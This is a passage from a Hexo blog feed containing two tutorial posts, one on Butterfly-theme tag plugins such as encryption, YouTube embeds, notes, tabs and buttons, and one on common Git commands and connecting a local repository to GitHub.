href="#Install-hexo-blog-encrypt-Plugin" class="headerlink" title="Install hexo-blog-encrypt Plugin"></a>Install hexo-blog-encrypt Plugin</h3><ul><li>Run <code>npm install hexo-blog-encrypt</code> in the hexo directory</li><li>Add the following content to the <code>/Hexo/_config.yml</code> file:</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">encrypt</span>:</span><br><span class="line"><span class="attr">enable</span>:<span class="literal">true</span></span><br></pre></td></tr></table></figure><h3 id="Using-the-Plugin"><a href="#Using-the-Plugin" class="headerlink" title="Using the Plugin"></a>Using the Plugin</h3><ul><li>Add the corresponding text to the header of the blog post where you want to use encryption:</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">---</span><br><span class="line"><span class="attr">title</span>: <span class="title class_">Hexo</span>加密功能</span><br><span class="line"><span class="attr">date</span>: <span class="number">2019</span>-<span class="number">09</span>-<span class="number">04</span> <span class="number">23</span>:<span class="number">20</span>:<span class="number">00</span>   </span><br><span class="line"><span class="attr">tags</span>: [学习笔记,<span class="title class_">Hexo</span>]</span><br><span class="line"><span class="attr">categories</span>: <span class="title class_">Hexo</span>      </span><br><span class="line"><span class="attr">password</span>: smile   </span><br><span class="line"><span class="attr">abstract</span>: <span class="title class_">Welcome</span> to my blog, enter password to read. </span><br><span class="line"><span class="attr">message</span>: 密码输入框上描述性内容</span><br><span class="line">---</span><br></pre></td></tr></table></figure><ul><li>Where:<ul><li>password: The password used for this blog post</li><li>abstract: Blog summary text (brief)</li><li>message: Descriptive text above the password input box</li></ul></li></ul><p><a href="https://cloud.tencent.com/developer/article/1917942">Original Link</a></p><hr><h2 id="Insert-YouTube-Videos"><a href="#Insert-YouTube-Videos" class="headerlink" title="Insert YouTube Videos"></a>Insert YouTube Videos</h2><h3 id="Static-Image-Link"><a href="#Static-Image-Link" class="headerlink" title="Static Image Link"></a>Static Image Link</h3><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Html version:</span><br><span class="line"></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;https://youtu.be/BSlMAJ7SkMA</span></span></span></span><br><span class="line"><span class="string"><span class="tag"><span class="language-xml">&quot;</span> <span class="attr">target</span>=<span class="string">&quot;_blank&quot;</span>&gt;</span></span><span class="language-xml"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;https://img.youtube.com/vi/ARted4RniaU/0.jpg&quot;</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml"><span class="attr">alt</span>=<span class="string">&quot;IMAGE ALT TEXT HERE&quot;</span> <span class="attr">width</span>=<span class="string">&quot;240&quot;</span> <span class="attr">height</span>=<span class="string">&quot;180&quot;</span> <span class="attr">border</span>=<span class="string">&quot;10&quot;</span> /&gt;</span></span><span class="language-xml"><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line">Pure markdown version:</span><br><span class="line"></span><br><span class="line">[<span class="string">![IMAGE ALT TEXT HERE</span>](<span class="link">https://img.youtube.com/vi/ARted4RniaU/0.jpg</span>)](<span class="link">https://www.youtube.com/watch?v=ARted4RniaU</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><a href="https://youtu.be/BSlMAJ7SkMA" target="_blank"><img src="https://img.youtube.com/vi/ARted4RniaU/0.jpg"alt="IMAGE ALT TEXT HERE" width="700" height="500" border="20" /></a></p><p>Pure markdown version:</p><p><a href="https://www.youtube.com/watch?v=ARted4RniaU"><img src="https://img.youtube.com/vi/ARted4RniaU/0.jpg" alt="IMAGE ALT TEXT HERE"></a></p><hr><h3 id="Embedded-Video"><a href="#Embedded-Video" class="headerlink" title="Embedded Video"></a>Embedded Video</h3><h4 id="Method-1"><a href="#Method-1" class="headerlink" title="Method 1:"></a>Method 1:</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% youtube video_id %&#125;</span><br></pre></td></tr></table></figure><div class="video-container"><iframe src="https://www.youtube.com/embed/BSlMAJ7SkMA" frameborder="0" loading="lazy" allowfullscreen></iframe></div><p>How to find the video ID:</p><p><img src="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/%E6%88%AA%E5%B1%8F2022-07-20%2015.05.24.png"></p><p>The <strong>string</strong> of letters and numbers after the address in the image, such as: BSlMAJ7SkMA</p><hr><h4 id="Method-2"><a href="#Method-2" class="headerlink" title="Method 2:"></a>Method 2:</h4><p>Click the embed option in the image above, which provides HTML code (HTML and markdown have some compatibility), and directly copy it to the md file.</p><p><img src="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/%E6%88%AA%E5%B1%8F2022-07-20%2015.05.39.png"></p><div class="note info flat"><p>You can modify some HTML attributes like width and height. Especially width&#x3D;100% will make it stretch to full width.</p></div><iframe width=100% height="400" src="https://www.youtube.com/embed/BSlMAJ7SkMA" title="YouTube video player" frameborder="10" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe><hr><h2 id="Block-Quote"><a href="#Block-Quote" class="headerlink" title="Block Quote"></a>Block Quote</h2><p>Add quotes to your blog…</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;% blockquote [author,source] [link] [source_link_title] %&#125;</span><br><span class="line">content</span><br><span class="line">&#123;% endblockquote %&#125;</span><br></pre></td></tr></table></figure><blockquote><p>Thank you for watching!</p><footer><strong>lixiang, daily</strong><cite><a href="https://hustlixiang21.github.io">Li Xiang's Blog</a></cite></footer></blockquote><hr><p>Can be nested!</p><blockquote><p>感谢观看！</p><blockquote><p>Thank you for watching!</p><footer><strong>lixiang, daily</strong><cite><a href="https://hustlixiang21.github.io">Li Xiang's Blog</a></cite></footer></blockquote><footer><strong>lixiang, daily</strong><cite><a href="https://hustlixiang21.github.io">李翔的博客</a></cite></footer></blockquote><hr><h2 id="Note-Bootstrap-Callout"><a href="#Note-Bootstrap-Callout" class="headerlink" title="Note (Bootstrap Callout)"></a>Note (Bootstrap Callout)</h2><p>Each method is divided into simple, modern, and flat themes, which are the so-called styles.</p><p>Here I only show the flat style</p><h3 id="Method-1-1"><a href="#Method-1-1" class="headerlink" title="Method 1:"></a>Method 1:</h3><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">&#123;% note flat %&#125;</span><br><span class="line">Default note block tag</span><br><span class="line">&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note default flat %&#125;</span><br><span class="line">default note block tag</span><br><span class="line">&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note primary flat %&#125;</span><br><span class="line">primary note block tag</span><br><span class="line">&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note success flat %&#125;</span><br><span class="line">success note block tag</span><br><span class="line">&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note info flat %&#125;</span><br><span class="line">info note block tag</span><br><span class="line">&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note warning flat %&#125;</span><br><span class="line">warning note block tag</span><br><span class="line">&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note danger flat %&#125;</span><br><span class="line">danger note block tag</span><br><span class="line">&#123;% endnote %&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><div class="note flat"><p>Default note block tag</p></div><div class="note default flat"><p>default note block tag</p></div><div class="note primary flat"><p>primary note block tag</p></div><div class="note success flat"><p>success note block tag</p></div><div class="note info flat"><p>info note block tag</p></div><div class="note warning flat"><p>warning note block tag</p></div><div class="note danger flat"><p>danger note block tag</p></div><hr><h3 id="Method-2-1"><a href="#Method-2-1" class="headerlink" title="Method 2:"></a>Method 2:</h3><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&#123;% note &#x27;fab fa-cc-visa&#x27; flat %&#125;</span><br><span class="line">Are you using Visa or UnionPay</span><br><span class="line">&#123;% endnote %&#125;</span><br><span class="line">&#123;% note blue &#x27;fas fa-bullhorn&#x27; flat %&#125;</span><br><span class="line">2021 is coming soon....</span><br><span class="line">&#123;% endnote %&#125;</span><br><span class="line">&#123;% note pink &#x27;fas fa-car-crash&#x27; flat %&#125;</span><br><span class="line">Drive carefully, safety first</span><br><span class="line">&#123;% endnote %&#125;</span><br><span class="line">&#123;% note red &#x27;fas fa-fan&#x27; flat%&#125;</span><br><span class="line">Is this three blades or four?</span><br><span class="line">&#123;% endnote %&#125;</span><br><span class="line">&#123;% note orange &#x27;fas fa-battery-half&#x27; flat %&#125;</span><br><span class="line">Are you using Visa or UnionPay</span><br><span class="line">&#123;% endnote %&#125;</span><br><span class="line">&#123;% note purple &#x27;far fa-hand-scissors&#x27; flat %&#125;</span><br><span class="line">Rock Paper Scissors</span><br><span class="line">&#123;% endnote %&#125;</span><br><span class="line">&#123;% note green &#x27;fab fa-internet-explorer&#x27; flat %&#125;</span><br><span class="line">The browser that frontend developers hate the most</span><br><span class="line">&#123;% endnote %&#125;</span><br></pre></td></tr></table></figure><div class="note icon-padding flat"><i class="note-icon fab fa-cc-visa"></i><p>Are you using Visa or UnionPay</p></div><div class="note blue icon-padding flat"><i class="note-icon fas fa-bullhorn"></i><p>2021 is coming soon….</p></div><div class="note pink icon-padding flat"><i class="note-icon fas fa-car-crash"></i><p>Drive carefully, safety first</p></div><div class="note red icon-padding flat"><i class="note-icon fas fa-fan"></i><p>Is this three blades or four?</p></div><div class="note orange icon-padding flat"><i class="note-icon fas fa-battery-half"></i><p>Are you using Visa or UnionPay</p></div><div class="note purple icon-padding flat"><i class="note-icon far fa-hand-scissors"></i><p>Rock Paper Scissors</p></div><div class="note green icon-padding flat"><i class="note-icon fab fa-internet-explorer"></i><p>The browser that frontend developers hate the most</p></div><hr><h2 id="Tabs"><a href="#Tabs" class="headerlink" title="Tabs"></a>Tabs</h2><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&#123;% tabs test1 %&#125;</span><br><span class="line">&lt;!-- tab --&gt;</span><br><span class="line"><span class="strong">**This is Tab 1.**</span></span><br><span class="line">&lt;!-- endtab --&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- tab --&gt;</span><br><span class="line"><span class="strong">**This is Tab 2.**</span></span><br><span class="line">&lt;!-- endtab --&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- tab --&gt;</span><br><span class="line"><span class="strong">**This is Tab 3.**</span></span><br><span class="line">&lt;!-- endtab --&gt;</span><br><span class="line">&#123;% endtabs %&#125;</span><br></pre></td></tr></table></figure><div class="tabs"><div class="nav-tabs"><button type="button" class="tab active">test1 1</button><button type="button" class="tab">test1 2</button><button type="button" class="tab">test1 3</button></div><div class="tab-contents"><div class="tab-item-content active"><p><strong>This is Tab 1.</strong></p></div><div class="tab-item-content"><p><strong>This is Tab 2.</strong></p></div><div class="tab-item-content"><p><strong>This is Tab 3.</strong></p></div></div><div class="tab-to-top"><button type="button" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div><hr><h2 id="Button"><a href="#Button" class="headerlink" title="Button"></a>Button</h2><h3 id="Inline"><a href="#Inline" class="headerlink" title="Inline"></a>Inline</h3><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">This is my website, click the button &#123;% btn &#x27;https://butterfly.js.org&#x27;,Butterfly %&#125;</span><br><span class="line">This is my website, click the button &#123;% btn &#x27;https://butterfly.js.org&#x27;,Butterfly,,outline%&#125;</span><br></pre></td></tr></table></figure><p>This is my website, click the button <a class="btn-beautify " href="https://butterfly.js.org" title="Butterfly"><span>Butterfly</span></a><br>This is my website, click the button <a class="btn-beautify outline" href="https://butterfly.js.org" title="Butterfly"><span>Butterfly</span></a></p><hr><h3 id="Block"><a href="#Block" class="headerlink" title="Block"></a>Block</h3><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">This is my website, click the button  &#123;% btn &#x27;https://butterfly.js.org&#x27;,Butterfly,far fa-hand-point-right,block larger %&#125;</span><br><span class="line">This is my website, click the button  &#123;% btn &#x27;https://butterfly.js.org&#x27;,Butterfly,far fa-hand-point-right,block center larger %&#125;</span><br><span class="line">This is my website, click the button  &#123;% btn &#x27;https://butterfly.js.org&#x27;,Butterfly,far fa-hand-point-right,block right blue larger %&#125;</span><br></pre></td></tr></table></figure><p>This is my website, click the button  <a class="btn-beautify block larger" href="https://butterfly.js.org" title="Butterfly"><i class="far fa-hand-point-right"></i><span>Butterfly</span></a><br>This is my website, click the button  <a class="btn-beautify block center larger" href="https://butterfly.js.org" title="Butterfly"><i class="far fa-hand-point-right"></i><span>Butterfly</span></a><br>This is my website, click the button  <a class="btn-beautify block right blue larger" href="https://butterfly.js.org" title="Butterfly"><i class="far fa-hand-point-right"></i><span>Butterfly</span></a></p><hr><h3 id="Options"><a href="#Options" class="headerlink" title="Options"></a>Options</h3><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;btn-center&quot;</span>&gt;</span></span></span><br><span class="line">&#123;% btn &#x27;https://butterfly.js.org&#x27;,Butterfly,far fa-hand-point-right,larger %&#125;</span><br><span class="line">&#123;% btn &#x27;https://butterfly.js.org&#x27;,Butterfly,far fa-hand-point-right,blue larger %&#125;</span><br><span class="line">&#123;% btn &#x27;https://butterfly.js.org&#x27;,Butterfly,far fa-hand-point-right,pink larger %&#125;</span><br><span class="line">&#123;% btn &#x27;https://butterfly.js.org&#x27;,Butterfly,far fa-hand-point-right,red larger %&#125;</span><br><span class="line">&#123;% btn &#x27;https://butterfly.js.org&#x27;,Butterfly,far fa-hand-point-right,purple larger %&#125;</span><br><span class="line">&#123;% btn &#x27;https://butterfly.js.org&#x27;,Butterfly,far fa-hand-point-right,orange larger %&#125;</span><br><span class="line">&#123;% btn &#x27;https://butterfly.js.org&#x27;,Butterfly,far fa-hand-point-right,green larger %&#125;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br></pre></td></tr></table></figure><div class="btn-center"><a class="btn-beautify larger" href="https://butterfly.js.org" title="Butterfly"><i class="far fa-hand-point-right"></i><span>Butterfly</span></a><a class="btn-beautify blue larger" href="https://butterfly.js.org" title="Butterfly"><i class="far fa-hand-point-right"></i><span>Butterfly</span></a><a class="btn-beautify pink larger" href="https://butterfly.js.org" title="Butterfly"><i class="far fa-hand-point-right"></i><span>Butterfly</span></a><a class="btn-beautify red larger" href="https://butterfly.js.org" title="Butterfly"><i class="far fa-hand-point-right"></i><span>Butterfly</span></a><a class="btn-beautify purple larger" href="https://butterfly.js.org" title="Butterfly"><i class="far fa-hand-point-right"></i><span>Butterfly</span></a><a class="btn-beautify orange larger" href="https://butterfly.js.org" title="Butterfly"><i class="far fa-hand-point-right"></i><span>Butterfly</span></a><a class="btn-beautify green larger" href="https://butterfly.js.org" title="Butterfly"><i class="far fa-hand-point-right"></i><span>Butterfly</span></a></div><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;btn-center&quot;</span>&gt;</span></span></span><br><span class="line">&#123;% btn &#x27;https://butterfly.js.org&#x27;,Butterfly,far fa-hand-point-right,outline larger %&#125;</span><br><span class="line">&#123;% btn &#x27;https://butterfly.js.org&#x27;,Butterfly,far fa-hand-point-right,outline blue larger %&#125;</span><br><span class="line">&#123;% btn &#x27;https://butterfly.js.org&#x27;,Butterfly,far fa-hand-point-right,outline pink larger %&#125;</span><br><span class="line">&#123;% btn &#x27;https://butterfly.js.org&#x27;,Butterfly,far fa-hand-point-right,outline red larger %&#125;</span><br><span class="line">&#123;% btn &#x27;https://butterfly.js.org&#x27;,Butterfly,far fa-hand-point-right,outline purple larger %&#125;</span><br><span class="line">&#123;% btn &#x27;https://butterfly.js.org&#x27;,Butterfly,far fa-hand-point-right,outline orange larger %&#125;</span><br><span class="line">&#123;% btn &#x27;https://butterfly.js.org&#x27;,Butterfly,far fa-hand-point-right,outline green larger %&#125;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br></pre></td></tr></table></figure><div class="btn-center"><a class="btn-beautify outline larger" href="https://butterfly.js.org" title="Butterfly"><i class="far fa-hand-point-right"></i><span>Butterfly</span></a><a class="btn-beautify outline blue larger" href="https://butterfly.js.org" title="Butterfly"><i class="far fa-hand-point-right"></i><span>Butterfly</span></a><a class="btn-beautify outline pink larger" href="https://butterfly.js.org" title="Butterfly"><i class="far fa-hand-point-right"></i><span>Butterfly</span></a><a class="btn-beautify outline red larger" href="https://butterfly.js.org" title="Butterfly"><i class="far fa-hand-point-right"></i><span>Butterfly</span></a><a class="btn-beautify outline purple larger" href="https://butterfly.js.org" title="Butterfly"><i class="far fa-hand-point-right"></i><span>Butterfly</span></a><a class="btn-beautify outline orange larger" href="https://butterfly.js.org" title="Butterfly"><i class="far fa-hand-point-right"></i><span>Butterfly</span></a><a class="btn-beautify outline green larger" href="https://butterfly.js.org" title="Butterfly"><i class="far fa-hand-point-right"></i><span>Butterfly</span></a></div>]]></content>
      
      
      <categories>
          
          <category> Writing </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Blog Writing Tips </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Git Remote Connection</title>
      <link href="/2022/07/17/Git%20Remote%20Connection/"/>
      <url>/2022/07/17/Git%20Remote%20Connection/</url>
      
        <content type="html"><![CDATA[<p>This is written following the previous article on Git Introduction, mainly because I encountered quite a few problems when trying to upload some resource files to GitHub.</p><p>I think there should be <strong>two</strong> ways to establish connections that I can currently implement.</p><p>Before describing the implementation methods, I think we should understand the <strong>remote operation commands</strong>.</p><h2 id="Common-Git-Commands"><a href="#Common-Git-Commands" class="headerlink" title="Common Git Commands"></a>Common Git Commands</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">git init                    //Initialize local repository, generate a .git folder, which is the core of git</span><br><span class="line"></span><br><span class="line">git add [target]            //Add target files to staging area</span><br><span class="line"></span><br><span class="line">git rm -f &lt;filename&gt;        //This command deletes the file from both staging area and working directory</span><br><span class="line"></span><br><span class="line">git rm --cached &lt;filename&gt;  //When you add files you don&#x27;t want, this command can delete files from staging area but keep them in working directory</span><br><span class="line"></span><br><span class="line">git commit                  //Commit files in staging area, use -m [message] to add necessary information (can also auto-popup if not added)</span><br><span class="line"></span><br><span class="line">git status                  //View git status</span><br><span class="line"></span><br><span class="line">git clone [url or ssh]      </span><br><span class="line">//Very important point is to clone the remote repository directly, it will automatically connect to the cloned remote repository by default, named origin</span><br><span class="line"></span><br><span class="line">git pull origin master      </span><br><span class="line">//Pull the corresponding branch from remote repository &quot;origin&quot; to master in local repository, often need to pull the latest repository before push</span><br><span class="line"></span><br><span class="line">git pull origin master --allow-unrelated-histories </span><br><span class="line">//If local and remote are two independent repositories, need to specify &quot;allow unrelated histories merge&quot; when pulling, otherwise it will fail</span><br><span class="line"></span><br><span class="line">git push origin master </span><br><span class="line">//Submit content from local repository to remote repository (origin is the remote branch name, master is the current branch name. Note that this command is not completely complete. In actual use, if it&#x27;s the first time submitting to remote, should use [git push -u origin master], if not the first time, just use git push directly)</span><br><span class="line"></span><br><span class="line">git remote add origin [url or ssh]</span><br><span class="line">//Add a remote repository connection and name it &quot;origin&quot;, of course can also customize other names, but generally named origin</span><br><span class="line"></span><br><span class="line">git remote rm origin        //Delete a remote repository connection named &quot;origin&quot;</span><br><span class="line"></span><br><span class="line">git remote set-url origin [url or ssh]</span><br><span class="line">//Modify the url of &quot;origin&quot; (combined with the above command, there are two ways to modify remote repository connection: one is delete then add, the other is direct modification)</span><br><span class="line"></span><br></pre></td></tr></table></figure><blockquote><p>Both URL and SSH can be viewed and copied from the code button in the repository interface, SSH is more secure.</p></blockquote><p><img src="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/20200213161009663.png" alt="Principle"></p><h3 id="Difference-between-git-add-and-git-add"><a href="#Difference-between-git-add-and-git-add" class="headerlink" title="Difference between git add . and git add *"></a>Difference between git add . and git add *</h3><p>git add . adds all files, folders and subfolders, including .gitignore and any other content starting with a dot;</p><p>git add * will add any files, folders and subfolders except those starting with a dot.</p><p>git add . also respects .gitignore, while git add * will throw an error when any non-dot file is gitignored. <u>Using git add . is much better than git add *</u>.</p><p>* is not part of git, it’s a wildcard interpreted by the shell. * expands to all files in the current directory, then passes to git, git adds all files. . is the current directory itself, git add will add it and all files under it.</p><p>add * means add all files in the current directory except files whose names start with a dot. This is a shell feature, Git only receives the file list.</p><p>add . has no special meaning in the shell, so git recursively adds the entire directory, almost the same, but includes files whose names start with a dot.</p><h3 id="Methods-to-Delete-Remote-Repository-Files"><a href="#Methods-to-Delete-Remote-Repository-Files" class="headerlink" title="Methods to Delete Remote Repository Files"></a>Methods to Delete Remote Repository Files</h3><p>One very important point to note when deleting is that files in the staging area <u>will not be cleared after commit</u>. Similarly, the files you deleted are still in the staging area, and you need to <u>remove the deleted files from the staging area</u> before you can commit.</p><h4 id="Delete-files-or-directories-from-both-current-working-directory-and-staging-area"><a href="#Delete-files-or-directories-from-both-current-working-directory-and-staging-area" class="headerlink" title="Delete files or directories from both current working directory and staging area."></a>Delete files or directories from both current working directory and staging area.</h4><p><code>git rm &lt;file&gt;</code><br><code>git rm -r &lt;path&gt;</code></p><h4 id="Only-delete-files-or-directories-from-staging-area"><a href="#Only-delete-files-or-directories-from-staging-area" class="headerlink" title="Only delete files or directories from staging area."></a>Only delete files or directories from staging area.</h4><p><code>git rm --cache &lt;file&gt;</code><br><code>git rm -r --cache &lt;path&gt;</code></p><h4 id="Direct-Deletion-Method"><a href="#Direct-Deletion-Method" class="headerlink" title="Direct Deletion Method"></a>Direct Deletion Method</h4><p>Directly delete specified files or directories. Suitable for cases where the number of files to be deleted is relatively small.</p><p><code>git rm -r --cached demo</code><br><code>git commit -m &#39;Delete demo folder&#39;</code><br><code>git push -u origin master</code></p><h4 id="Filter-Deletion-Method"><a href="#Filter-Deletion-Method" class="headerlink" title="Filter Deletion Method"></a>Filter Deletion Method</h4><p>Add a .gitignore file in the project root directory to filter out unwanted files, then execute commands. The principle of this operation is to delete all files in the staging area, then add files filtered by the .gitignore file to the staging area through the git add . command. This method is suitable for bulk deletion of files.</p><p><code>git rm -r --cached .</code><br><code>git add .</code><br><code>git commit</code><br><code>git push  -u origin master</code></p><p>Whether direct deletion or filter deletion, the purpose is to delete the records of already deleted files in the staging area.</p><p>PS: Pay attention to various information in your command line prompts</p><h2 id="First-Implementation-Method-git-clone"><a href="#First-Implementation-Method-git-clone" class="headerlink" title="First Implementation Method (git clone)"></a>First Implementation Method (git clone)</h2><h3 id="Step1-Create-a-repository-named-git-test-on-GitHub"><a href="#Step1-Create-a-repository-named-git-test-on-GitHub" class="headerlink" title="Step1: Create a repository named git_test on GitHub"></a>Step1: Create a repository named git_test on GitHub</h3><p><img src="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/%E6%88%AA%E5%B1%8F2022-07-17%2017.12.03.png"></p><h3 id="Step2-Enter-a-folder-and-use-git-clone"><a href="#Step2-Enter-a-folder-and-use-git-clone" class="headerlink" title="Step2: Enter a folder and use git clone "></a>Step2: Enter a folder and use git clone <repository URL or SSH></h3><p><img src="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/%E6%88%AA%E5%B1%8F2022-07-17%2019.28.52.png"></p><p>At this point, git clone completely clones the entire repository to local. It will generate a folder with the same name as the repository. Enter the folder and you can directly see the .git file.</p><h3 id="Step3-No-need-for-remote-connection-automatically-established-connection-default-origin"><a href="#Step3-No-need-for-remote-connection-automatically-established-connection-default-origin" class="headerlink" title="Step3: No need for remote connection, automatically established connection (default origin)"></a>Step3: No need for remote connection, automatically established connection (default origin)</h3><p>Use git remote -v to view remote connection information</p><p><img src="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/%E6%88%AA%E5%B1%8F2022-07-17%2019.35.28.png"></p><h3 id="Step4-Create-test-files-and-commit-to-remote-repository"><a href="#Step4-Create-test-files-and-commit-to-remote-repository" class="headerlink" title="Step4: Create test files and commit to remote repository"></a>Step4: Create test files and commit to remote repository</h3><p><img src="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/%E6%88%AA%E5%B1%8F2022-07-17%2019.39.24.png"></p><p><img src="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/%E6%88%AA%E5%B1%8F2022-07-17%2019.42.25.png"></p><p>Testing complete!</p><h2 id="Second-Implementation-Method-Initialize-Local-Repository-Manually-Add-Connection"><a href="#Second-Implementation-Method-Initialize-Local-Repository-Manually-Add-Connection" class="headerlink" title="Second Implementation Method (Initialize Local Repository + Manually Add Connection)"></a>Second Implementation Method (Initialize Local Repository + Manually Add Connection)</h2><h3 id="Step1-Create-a-new-repository-on-GitHub-while-initializing-a-local-repository"><a href="#Step1-Create-a-new-repository-on-GitHub-while-initializing-a-local-repository" class="headerlink" title="Step1: Create a new repository on GitHub while initializing a local repository"></a>Step1: Create a new repository on GitHub while initializing a local repository</h3><p>Create new repository:</p><p><img src="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/%E6%88%AA%E5%B1%8F2022-07-17%2019.52.37.png"></p><p>Enter folder ~&#x2F;Desktop&#x2F;git_freely and use git init to initialize local repository</p><p><img src="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/%E6%88%AA%E5%B1%8F2022-07-17%2019.54.27.png"></p><p>It can also be seen that the local repository has not established a remote connection.</p><h3 id="Step2-Establish-remote-connection"><a href="#Step2-Establish-remote-connection" class="headerlink" title="Step2: Establish remote connection"></a>Step2: Establish remote connection</h3><p><img src="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/%E6%88%AA%E5%B1%8F2022-07-17%2019.56.10.png"></p><p>It can be seen that a remote connection has been established at this time, and the name given to the remote repository can actually be arbitrary (usually origin), I named it lixiang.</p><h3 id="Ask-a-question-Can-we-directly-create-test-files-according-to-the-first-implementation-method-at-this-time-then-git-add-commit-push"><a href="#Ask-a-question-Can-we-directly-create-test-files-according-to-the-first-implementation-method-at-this-time-then-git-add-commit-push" class="headerlink" title="Ask a question: Can we directly create test files according to 